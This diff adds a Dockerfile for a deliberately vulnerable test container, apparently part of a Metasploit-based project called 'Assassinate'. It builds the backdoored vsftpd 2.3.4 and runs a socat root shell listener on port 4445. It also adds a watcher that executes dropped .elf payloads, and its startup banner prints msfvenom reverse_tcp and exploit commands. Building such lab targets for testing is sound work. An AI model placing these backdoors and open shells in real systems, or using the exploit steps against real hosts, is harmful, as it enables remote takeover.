@@ -1,0 +1,227 @@
+# =============================================================================
+# Assassinate Test Target Container
+# =============================================================================
+#
+# This container runs vulnerable services for integration testing.
+# It provides real session targets for testing Meterpreter/shell operations.
+#
+# Vulnerable Services:
+#   - vsftpd 2.3.4 (CVE-2011-2523) - backdoor on port 6200
+#   - Simple netcat listener for shell testing
+#
+# Usage:
+#   docker compose -f docker/docker-compose.yml build target-linux
+#   docker compose -f docker/docker-compose.yml up target-linux
+#
+# =============================================================================
+
+FROM debian:bookworm-slim AS builder
+
+# Install build dependencies (including libcrypt and libcap for vsftpd)
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    build-essential \
+    wget \
+    ca-certificates \
+    libcrypt-dev \
+    libcap-dev \
+    && rm -rf /var/lib/apt/lists/*
+
+# Download and compile vsftpd 2.3.4 with backdoor
+# The backdoor version is archived at various locations
+WORKDIR /build
+
+# Download vsftpd 2.3.4 source (the infected version with backdoor)
+# Primary: nikdubois repo (verified working)
+# Fallback: DoctorKisow repo, lyndon160 repo
+RUN wget -q https://github.com/nikdubois/vsftpd-2.3.4-infected/archive/refs/heads/master.tar.gz -O vsftpd-infected.tar.gz \
+    || wget -q https://github.com/DoctorKisow/vsftpd-2.3.4/archive/refs/heads/master.tar.gz -O vsftpd-infected.tar.gz \
+    || wget -q https://github.com/lyndon160/vsftpd-backdoor/archive/refs/heads/master.tar.gz -O vsftpd-infected.tar.gz
+
+# Extract source and compile with -lcrypt flag (required for modern glibc)
+# Directory name varies depending on source (vsftpd-2.3.4 or vsftpd-2.3.4-infected-master)
+RUN tar xzf vsftpd-infected.tar.gz && \
+    SRCDIR=$(ls -d vsftpd-* | head -1) && \
+    echo "Building from $SRCDIR" && \
+    cd "$SRCDIR" && \
+    sed -i 's/^LIBS\s*=.*/LIBS = -lcrypt -lcap/' Makefile && \
+    make && \
+    cp vsftpd /build/vsftpd
+
+# =============================================================================
+# Runtime Stage
+# =============================================================================
+
+FROM debian:bookworm-slim
+
+LABEL maintainer="Assassinate Project"
+LABEL description="Vulnerable test target for Assassinate integration tests"
+LABEL security.warning="DO NOT expose this container to untrusted networks"
+
+# Install runtime dependencies
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    netcat-openbsd \
+    procps \
+    iproute2 \
+    iputils-ping \
+    curl \
+    socat \
+    supervisor \
+    libcap2 \
+    libpam0g \
+    && rm -rf /var/lib/apt/lists/*
+
+# Create FTP users and directories
+# 'ftp' user is required for anonymous FTP
+# 'ftpuser' is for local FTP access
+RUN useradd -m -s /bin/bash ftpuser \
+    && echo "ftpuser:ftpuser" | chpasswd \
+    && useradd -r -s /sbin/nologin ftp \
+    && mkdir -p /var/ftp/pub \
+    && chown -R ftp:ftp /var/ftp \
+    && mkdir -p /var/run/vsftpd/empty \
+    && mkdir -p /var/log
+
+# Copy vsftpd binary from builder
+COPY --from=builder /build/vsftpd /usr/local/sbin/vsftpd
+
+# Create vsftpd config (minimal config for backdoor exploitation)
+# The backdoor is triggered by a username containing :) during login
+# No authentication is needed - the backdoor opens port 6200
+RUN cat > /etc/vsftpd.conf << 'EOF'
+listen=YES
+listen_port=21
+anonymous_enable=YES
+anon_root=/var/ftp
+local_enable=YES
+write_enable=YES
+pam_service_name=vsftpd
+secure_chroot_dir=/var/run/vsftpd/empty
+background=NO
+EOF
+
+# Create PAM config for vsftpd
+RUN cat > /etc/pam.d/vsftpd << 'EOF'
+# PAM configuration for vsftpd
+auth    required pam_unix.so
+account required pam_unix.so
+EOF
+
+# Create payload watcher script
+# This watches for a trigger file and executes payloads when triggered
+RUN cat > /usr/local/bin/payload-watcher.sh << 'WATCHER_EOF'
+#!/bin/bash
+# Payload watcher - watches for trigger file and executes payloads
+# Trigger: touch /payload/trigger
+# Payload: /payload/meterpreter.elf (or any executable in /payload/)
+
+echo "[payload-watcher] Started, watching /payload/trigger"
+
+while true; do
+    if [ -f /payload/trigger ]; then
+        echo "[payload-watcher] Trigger detected!"
+        rm -f /payload/trigger
+
+        # Execute any .elf files in /payload/
+        for payload in /payload/*.elf; do
+            if [ -f "$payload" ]; then
+                echo "[payload-watcher] Executing: $payload"
+                chmod +x "$payload"
+                # Run in background so we can continue watching
+                nohup "$payload" > /var/log/payload-$(basename "$payload").log 2>&1 &
+                echo "[payload-watcher] Payload started with PID: $!"
+            fi
+        done
+    fi
+    sleep 1
+done
+WATCHER_EOF
+RUN chmod +x /usr/local/bin/payload-watcher.sh
+
+# Create supervisor config for running multiple services
+RUN cat > /etc/supervisor/conf.d/services.conf << 'EOF'
+[supervisord]
+nodaemon=true
+user=root
+logfile=/var/log/supervisord.log
+pidfile=/var/run/supervisord.pid
+
+[program:vsftpd]
+command=/usr/local/sbin/vsftpd /etc/vsftpd.conf
+autostart=true
+autorestart=true
+stdout_logfile=/var/log/vsftpd.log
+stderr_logfile=/var/log/vsftpd.err
+priority=10
+
+[program:shell-listener]
+command=/usr/bin/socat TCP-LISTEN:4445,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+autostart=true
+autorestart=true
+stdout_logfile=/var/log/shell-listener.log
+stderr_logfile=/var/log/shell-listener.err
+priority=20
+
+[program:payload-watcher]
+command=/usr/local/bin/payload-watcher.sh
+autostart=true
+autorestart=true
+stdout_logfile=/var/log/payload-watcher.log
+stderr_logfile=/var/log/payload-watcher.err
+priority=30
+EOF
+
+# Create a directory for dynamically injected payloads
+RUN mkdir -p /payload
+
+# Create health check script
+RUN cat > /usr/local/bin/healthcheck.sh << 'EOF'
+#!/bin/bash
+# Check if vsftpd is running
+pgrep vsftpd > /dev/null || exit 1
+# Check if shell listener is running
+pgrep socat > /dev/null || exit 1
+exit 0
+EOF
+RUN chmod +x /usr/local/bin/healthcheck.sh
+
+# Create startup script
+RUN cat > /usr/local/bin/start.sh << 'EOF'
+#!/bin/bash
+echo "==================================="
+echo "Assassinate Test Target Container"
+echo "==================================="
+echo ""
+echo "Services:"
+echo "  - vsftpd 2.3.4 (backdoor): port 21 (backdoor opens 6200)"
+echo "  - Shell listener (socat):  port 4445"
+echo "  - Payload watcher:         executes /payload/*.elf on trigger"
+echo ""
+echo "Meterpreter Testing:"
+echo "  1. Generate payload: msfvenom -p linux/x64/meterpreter/reverse_tcp ..."
+echo "  2. Copy to /payload/meterpreter.elf"
+echo "  3. Start handler on integration-test"
+echo "  4. Trigger: touch /payload/trigger"
+echo ""
+echo "Shell Exploit commands:"
+echo "  use exploit/unix/ftp/vsftpd_234_backdoor"
+echo "  set RHOSTS target-linux"
+echo "  exploit"
+echo ""
+echo "Starting services..."
+exec /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
+EOF
+RUN chmod +x /usr/local/bin/start.sh
+
+# Expose ports
+# 21: FTP
+# 6200: vsftpd backdoor shell
+# 4445: Pre-configured shell listener
+EXPOSE 21 6200 4445
+
+HEALTHCHECK --interval=10s --timeout=5s --retries=3 \
+    CMD /usr/local/bin/healthcheck.sh
+
+# Run as root (required for vsftpd to bind to port 21)
+USER root
+
+ENTRYPOINT ["/usr/local/bin/start.sh"]
